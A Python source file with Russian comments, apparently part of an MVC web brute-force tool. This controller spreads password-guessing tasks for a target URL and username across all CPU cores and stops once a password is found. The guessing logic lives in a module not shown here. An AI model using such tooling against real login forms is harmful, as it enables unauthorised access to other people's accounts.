"""Модуль контроллера (Controller) для веб-брутфорса.

Управляет жизненным циклом параллельных процессов и связывает Модель с Представлением.
"""

import multiprocessing
import sys
import time
from brute_force_web import BruteForceModel
from view import ConsoleView


class BruteForceController:
    """Координирует работу приложения, распределяя задачи по процессам."""

    def __init__(self, model: BruteForceModel, view: ConsoleView):
        """Инициализирует контроллер, принимая компоненты архитектуры.

        Args:
            model (BruteForceModel): Экземпляр бизнес-логики.
            view (ConsoleView): Экземпляр визуального интерфейса.
        """
        self.model = model
        self.view = view

    def start_attack(self):
        """Инициирует многопроцессорную атаку на форму."""
        # Вычисляем доступные ядра процессора для распараллеливания
        num_cores = multiprocessing.cpu_count()

        # Отображаем приветственный баннер через View
        self.view.show_banner(
            self.model.target_url, self.model.username, num_cores
        )

        # Формируем список уникальных префиксов (задач) по буквам алфавита
        tasks = [char for char in self.model.alphabet]

        start_time = time.time()

        # Запускаем пул процессов. Каждый процесс выполняет метод модели search_sector
        with multiprocessing.Pool(processes=num_cores) as pool:
            # imap_unordered позволяет мгновенно поймать результат от первого освободившегося ядра
            for result in pool.imap_unordered(self.model.search_sector, tasks):
                if result:
                    elapsed = time.time() - start_time

                    # Передаем данные во View для отрисовки успеха
                    self.view.report_success(result, elapsed)

                    # Немедленно останавливаем остальные воркеры и выходим
                    pool.terminate()
                    sys.exit(0)

        # Если все задачи выполнены, но пароль так и не вернулся
        self.view.report_failure()